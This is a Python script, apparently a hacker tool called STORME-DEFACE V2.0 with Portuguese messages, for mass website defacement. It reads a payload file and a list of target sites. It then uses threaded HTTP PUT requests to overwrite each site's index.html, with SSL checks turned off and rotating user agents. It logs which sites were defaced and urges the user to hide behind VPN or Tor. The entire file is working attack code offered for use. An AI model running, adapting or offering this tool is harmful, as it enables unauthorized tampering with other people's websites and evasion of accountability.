#-*- coding: utf-8 -*-
# STORME-DEFACE V2.0 | @18shinstorme | KEY: stormeshin18

import os
import sys
import time
import random
import threading
import requests

# ===== CORES E ESTILOS =====
class Colors:
    RED = "\033[31m"
    GREEN = "\033[32m"
    YELLOW = "\033[33m"
    BLUE = "\033[34m"
    PURPLE = "\033[35m"
    CYAN = "\033[36m"
    BOLD = "\033[1m"
    RESET = "\033[0m"

# ===== BANNER FIXO =====
BANNER = f"""
{Colors.CYAN}
             ___
           /  >  フ   
          /   _  _|    {Colors.BOLD}Author: @18shinstorme{Colors.RESET}
        /`   ミ_x/      {Colors.BOLD}Version: STORME-DEFACE V2.0{Colors.RESET}
     _//        |       {Colors.BOLD}Key: stormeshin18{Colors.RESET}
    /  ヽ       ﾉ       {Colors.BOLD}Date: {time.strftime("%Y-%m-%d")}{Colors.RESET}
    │     | | |
  /￣\\   | | |  
  | (￣ヽ＿ヽ)_)
   ＼二つ
{Colors.RESET}
"""

# ===== CONFIGURAÇÕES =====
MAX_THREADS = 5
TIMEOUT = 15

def animate():
    animations = ["⚡", "🔥", "💀", "🖤"]
    messages = [
        "Contornando firewalls...",
        "Injetando payload...",
        "Sobrescrevendo arquivos...",
        "Explorando vulnerabilidades..."
    ]
    while True:
        for anim in animations:
            sys.stdout.write(f"\r{Colors.RED}{Colors.BOLD}[{anim}] {random.choice(messages)}{Colors.RESET}")
            sys.stdout.flush()
            time.sleep(0.3)

def validate_target(url):
    """Padroniza URLs"""
    url = url.strip()
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    return url.rstrip('/')

def generate_user_agent():
    """Gera User-Agent aleatório"""
    agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
    ]
    return random.choice(agents)

def log_attack(target, status):
    """Registra ataques em log"""
    with open("storme.log", "a") as f:
        f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {target} -> {status}\n")

def storme_input(prompt):
    """Input compatível com Python 2 e 3"""
    try:
        return input(prompt)
    except:
        import __builtin__
        return __builtin__.raw_input(prompt)

def deface_attack(script_path, target_file="targets.txt"):
    try:
        # Verifica arquivos
        if not os.path.isfile(script_path):
            raise FileNotFoundError(f"Arquivo {script_path} não encontrado!")
        
        if not os.path.isfile(target_file):
            raise FileNotFoundError(f"Arquivo {target_file} não encontrado!")

        # Carrega payload e targets
        with open(script_path, "r") as f:
            payload = f.read()

        with open(target_file, "r") as f:
            targets = [line.strip() for line in f if line.strip()]

        if not targets:
            raise ValueError("Nenhum alvo válido em targets.txt!")

        # Configura sessão
        session = requests.Session()
        session.headers.update({"User-Agent": generate_user_agent()})
        session.verify = False  # Ignora erros de SSL

        print(f"\n{Colors.YELLOW}{Colors.BOLD}[!] Iniciando ataque contra {len(targets)} alvos...{Colors.RESET}\n")

        # Inicia animação
        anim_thread = threading.Thread(target=animate)
        anim_thread.daemon = True
        anim_thread.start()

        # Semáforo para limitar threads
        thread_limiter = threading.BoundedSemaphore(MAX_THREADS)

        def attack(site):
            try:
                with thread_limiter:
                    site = validate_target(site)
                    try:
                        r = session.put(
                            f"{site}/index.html",
                            data=payload,
                            timeout=TIMEOUT
                        )
                        if 200 <= r.status_code < 300:
                            msg = f"[SUCESSO] Defaced -> {site}"
                            print(f"{Colors.GREEN}{msg}{Colors.RESET}")
                            log_attack(site, "SUCESSO")
                        else:
                            msg = f"[FALHA] Status {r.status_code} -> {site}"
                            print(f"{Colors.RED}{msg}{Colors.RESET}")
                            log_attack(site, f"FALHA ({r.status_code})")
                    except Exception as e:
                        msg = f"[ERRO] {str(e)} -> {site}"
                        print(f"{Colors.PURPLE}{msg}{Colors.RESET}")
                        log_attack(site, f"ERRO ({str(e)})")
            except Exception as e:
                print(f"{Colors.RED}{Colors.BOLD}[!] Erro na thread: {str(e)}{Colors.RESET}")

        # Inicia threads
        threads = []
        for target in targets:
            t = threading.Thread(target=attack, args=(target,))
            t.daemon = True
            threads.append(t)
            t.start()

        # Aguarda conclusão
        for t in threads:
            t.join()

    except Exception as e:
        print(f"\n{Colors.RED}{Colors.BOLD}[ERRO GRAVE] {str(e)}{Colors.RESET}")
    finally:
        print(f"\n{Colors.BLUE}{Colors.BOLD}[*] Ataque concluído. Verifique storme.log para detalhes.{Colors.RESET}")

def main():
    try:
        print(BANNER)
        print(f"{Colors.YELLOW}{Colors.BOLD}[!] ATENÇÃO: Use VPN/TOR para anonimato!{Colors.RESET}\n")

        while True:
            script = storme_input(f"{Colors.RED}⚡ Script path (ex: index.html): {Colors.RESET}")
            if os.path.isfile(script):
                break
            print(f"{Colors.RED}[!] Arquivo não encontrado!{Colors.RESET}")

        deface_attack(script)

    except KeyboardInterrupt:
        print(f"\n{Colors.RED}{Colors.BOLD}[!] Operação cancelada pelo usuário.{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.RED}{Colors.BOLD}[!] Erro crítico: {str(e)}{Colors.RESET}")

if __name__ == "__main__":
    main()
